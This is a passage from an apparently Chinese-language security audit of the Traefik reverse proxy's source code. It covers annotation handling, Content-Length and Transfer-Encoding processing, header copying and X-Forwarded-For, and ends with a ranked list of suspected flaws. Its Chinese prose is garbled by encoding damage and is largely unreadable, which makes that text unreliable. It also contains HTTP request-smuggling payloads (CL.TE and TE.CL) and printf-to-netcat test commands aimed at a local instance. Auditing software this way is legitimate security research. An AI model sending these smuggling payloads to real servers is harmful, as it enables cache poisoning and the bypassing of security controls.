- æ˜¯å¦å¯èƒ½ç»•è¿‡åè®®æ£€æµ‹ï¼Ÿ

### 6.2 é…ç½®æ³¨å…¥

**å…³é”®ä»£ç ï¼š**
```go
// pkg/provider/kubernetes/ingress/annotations.go:91-113
func convertAnnotations(annotations map[string]string) map[string]string {
    // ...
    result[newKey] = value  // value æ˜¯å¦ç»è¿‡éªŒè¯ï¼Ÿ
}
```

**æ£€æŸ¥ç‚¹ï¼š**
- æ³¨è§£å€¼æ˜¯å¦é™åˆ¶é•¿åº¦ï¼Ÿ
- ç‰¹æ®Šå­—ç¬¦æ˜¯å¦è¢«å¤„ç†ï¼Ÿ

---

## åˆ†æ #6: Content-Length å¤„ç†

### 6.1 ä»£ç ä½ç½®å’Œé€»è¾‘åˆ†æ

#### å…³é”®æ–‡ä»¶
- `pkg/proxy/fast/proxy.go:211` - è¯·æ±‚ä½“è®¾ç½®
- `pkg/proxy/fast/connpool.go:224-308` - å“åº” Content-Length å¤„ç†

#### è¯¦ç»†ä»£ç åˆ†æ

**æ­¥éª¤ 1: è¯·æ±‚ä½“è½¬å‘**

```211:211:pkg/proxy/fast/proxy.go
outReq.SetBodyStream(req.Body, int(req.ContentLength))
```

**åˆ†æï¼š**
- ä½¿ç”¨ `req.ContentLength` è®¾ç½®è¯·æ±‚ä½“å¤§å°
- **é—®é¢˜ï¼š** å¦‚æœ `ContentLength` ä¸å®é™…ä¸åŒ¹é…ä¼šæ€æ ·ï¼Ÿ
- **é—®é¢˜ï¼š** å¦‚æœåŒæ—¶å­˜åœ¨ `Content-Length` å’Œ `Transfer-Encoding: chunked` ä¼šæ€æ ·ï¼Ÿ

**æ­¥éª¤ 2: å“åº” Content-Length å¤„ç†**

```224:308:pkg/proxy/fast/connpool.go
contentLength := res.Header.ContentLength()

if contentLength == 0 {
	return nil
}

// Chunked response, Content-Length is set to -1 by FastProxy when "Transfer-Encoding: chunked" header is received.
if contentLength == -1 {
	cbr := httputil.NewChunkedReader(c.br)
	// ... å¤„ç† chunked encoding
}

// Response with a valid Content-Length header.
brl.N = int64(res.Header.ContentLength())
```

**åˆ†æï¼š**
- âœ… åŒºåˆ†äº† chunked (`-1`) å’Œå›ºå®šé•¿åº¦
- âš ï¸ **ä½†è¯·æ±‚å¤„ç†å‘¢ï¼Ÿ** éœ€è¦æ£€æŸ¥è¯·æ±‚è§£æé€»è¾‘

### 6.2 æ½œåœ¨æ¼æ´ç‚¹

#### æ¼æ´ç‚¹ 1: CL.TE å†²çª

**åœºæ™¯ï¼š**
```http
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**é—®é¢˜ï¼š** Go æ ‡å‡†åº“å¦‚ä½•å¤„ç†ï¼ŸTraefik å¦‚ä½•è½¬å‘ï¼Ÿ

#### æ¼æ´ç‚¹ 2: TE.CL å†²çª

**åœºæ™¯ï¼š**
```http
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked
Content-Length: 3

0

SMUGGLED
```

**é—®é¢˜ï¼š** å“ªä¸ªä¼˜å…ˆçº§æ›´é«˜ï¼Ÿ

### 6.3 æµ‹è¯•æ­¥éª¤

**æµ‹è¯• 1: CL.TE**
```bash
printf "POST / HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED" | nc localhost 8080
```

**æµ‹è¯• 2: TE.CL**
```bash
printf "POST / HTTP/1.1\r\nHost: localhost:8080\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n0\r\n\r\nSMUGGLED" | nc localhost 8080
```

### 6.4 é£é™©è¯„ä¼°

- **ä¸¥é‡æ€§ï¼š** ğŸ”´ CRITICALï¼ˆå¦‚æœå­˜åœ¨ï¼‰
- **å½±å“ï¼š** è¯·æ±‚èµ°ç§ã€ç¼“å­˜æŠ•æ¯’ã€ç»•è¿‡å®‰å…¨æ§åˆ¶
- **åˆ©ç”¨éš¾åº¦ï¼š** ğŸŸ¡ MEDIUM
- **éœ€è¦éªŒè¯ï¼š** å®é™…æµ‹è¯• Go æ ‡å‡†åº“å’Œ Traefik çš„è¡Œä¸º

---

## åˆ†æ #7: Fast HTTP ä»£ç†å¤´éƒ¨å¤„ç†

### 7.1 ä»£ç ä½ç½®å’Œé€»è¾‘åˆ†æ

#### å…³é”®æ–‡ä»¶
- `pkg/proxy/fast/proxy.go:141-145` - å¤´éƒ¨å¤åˆ¶

#### è¯¦ç»†ä»£ç åˆ†æ

**æ­¥éª¤ 1: å¤´éƒ¨å¤åˆ¶**

```141:145:pkg/proxy/fast/proxy.go
for k, v := range req.Header {
	for _, s := range v {
		outReq.Header.Add(k, s)
	}
}
```

**åˆ†æï¼š**
- å¤åˆ¶æ‰€æœ‰è¯·æ±‚å¤´åˆ°è½¬å‘è¯·æ±‚
- **é—®é¢˜ï¼š** æ˜¯å¦è¿‡æ»¤äº†æ¶æ„å¤´éƒ¨ï¼Ÿ
- **é—®é¢˜ï¼š** æ˜¯å¦éªŒè¯äº†å¤´éƒ¨å€¼ï¼Ÿ

**æ­¥éª¤ 2: X-Forwarded-For å¤„ç†**

```215:229:pkg/proxy/fast/proxy.go
if !proxyhttputil.ShouldNotAppendXFF(req.Context()) {
	if clientIP, _, err := net.SplitHostPort(req.RemoteAddr); err == nil {
		// If we aren't the first proxy retain prior
		// X-Forwarded-For information as a comma+space
		// separated list and fold multiple headers into one.
		prior, ok := req.Header["X-Forwarded-For"]
		if len(prior) > 0 {
			clientIP = strings.Join(prior, ", ") + ", " + clientIP
		}

		omit := ok && prior == nil // Go Issue 38079: nil now means don't populate the header
		if !omit {
			outReq.Header.Set("X-Forwarded-For", clientIP)
		}
	}
}
```

**åˆ†æï¼š**
- âš ï¸ **ç›´æ¥ä½¿ç”¨ `strings.Join(prior, ", ")`**ï¼Œæ²¡æœ‰éªŒè¯
- âš ï¸ **å¯èƒ½åŒ…å« CRLF å­—ç¬¦**

### 7.2 æ½œåœ¨æ¼æ´ç‚¹

åŒåˆ†æ #2ï¼ˆHeader Injectionï¼‰ï¼Œä½†è¿™æ˜¯ Fast HTTP ä»£ç†çš„å®ç°ã€‚

---

## æ€»ç»“å’Œä¼˜å…ˆçº§

### é«˜ä¼˜å…ˆçº§ï¼ˆéœ€è¦ç«‹å³éªŒè¯ï¼‰

1. **HTTP Header Injection** (åˆ†æ #2, #7)
   - ä»£ç ä½ç½®æ˜ç¡®
   - å½±å“ä¸¥é‡
   - å®¹æ˜“æµ‹è¯•

2. **Forward Auth å¤´éƒ¨æ³¨å…¥** (åˆ†æ #3)
   - ä»£ç ä½ç½®æ˜ç¡®
   - éœ€è¦ `trustForwardHeader=true`
   - å½±å“ä¸¥é‡

3. **HTTP Request Smuggling** (åˆ†æ #1, #6)
   - éœ€è¦éªŒè¯ Go æ ‡å‡†åº“è¡Œä¸º
   - å½±å“ä¸¥é‡
   - æµ‹è¯•è¾ƒå¤æ‚

### ä¸­ä¼˜å…ˆçº§

4. **ReDoS** (åˆ†æ #4)
   - éœ€è¦æ¶æ„é…ç½®æˆ–è§„åˆ™
   - å½±å“ä¸­ç­‰
   - å®¹æ˜“æµ‹è¯•

5. **è·¯å¾„å¤„ç†** (åˆ†æ #5)
   - å¯èƒ½è¢«æ ‡å‡†åº“ä¿æŠ¤
   - å½±å“ä¸­ç­‰
   - éœ€è¦éªŒè¯

---

## ä¸‹ä¸€æ­¥è¡ŒåŠ¨

### 1. æ­å»ºæµ‹è¯•ç¯å¢ƒ

```bash
# å¯åŠ¨ Traefik
go run ./cmd/traefik --api.insecure=true --entrypoints.web.address=:8080

# æˆ–ä½¿ç”¨é…ç½®æ–‡ä»¶
go run ./cmd/traefik --configFile=traefik-simple.yml
```

### 2. è¿è¡Œå®é™…æµ‹è¯•

ä¸ºæ¯ä¸ªæ¼æ´ç‚¹ç¼–å†™æµ‹è¯•è„šæœ¬ï¼ŒéªŒè¯æ˜¯å¦å­˜åœ¨é—®é¢˜ã€‚

### 3. éªŒè¯æ¯ä¸ªæ½œåœ¨é—®é¢˜

- æµ‹è¯• Header Injection
- æµ‹è¯• Request Smuggling
- æµ‹è¯• Forward Auth
- æµ‹è¯• ReDoS
- æµ‹è¯•è·¯å¾„å¤„ç†

### 4. ç¼–å†™ PoC

å¦‚æœå‘ç°é—®é¢˜ï¼Œç¼–å†™æ¦‚å¿µéªŒè¯ä»£ç ã€‚

### 5. è¯„ä¼°å½±å“

ç¡®å®šå®é™…é£é™©å’Œåˆ©ç”¨æ¡ä»¶ã€‚

---

**æ³¨æ„ï¼š** è¿™äº›åˆ†æåŸºäºä»£ç å®¡æŸ¥ï¼Œéœ€è¦å®é™…æµ‹è¯•éªŒè¯ã€‚æŸäº›é—®é¢˜å¯èƒ½å·²è¢« Go æ ‡å‡†åº“æˆ–å…¶ä»–ä¿æŠ¤æœºåˆ¶ç¼“è§£ã€‚

